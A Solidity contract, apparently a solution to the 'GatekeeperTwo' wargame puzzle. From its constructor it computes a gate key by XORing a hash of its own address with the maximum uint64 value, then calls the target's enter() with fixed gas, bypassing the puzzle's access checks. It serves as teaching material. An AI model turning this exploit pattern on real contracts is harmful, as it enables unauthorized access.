// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface GatekeeperTwoInterface {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttack {
    GatekeeperTwoInterface gatekeeper;

    constructor(address GatekeeperTwoContractAddress) {
        gatekeeper = GatekeeperTwoInterface(GatekeeperTwoContractAddress);
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        gatekeeper.enter{gas: 50000}(key);
    }
}
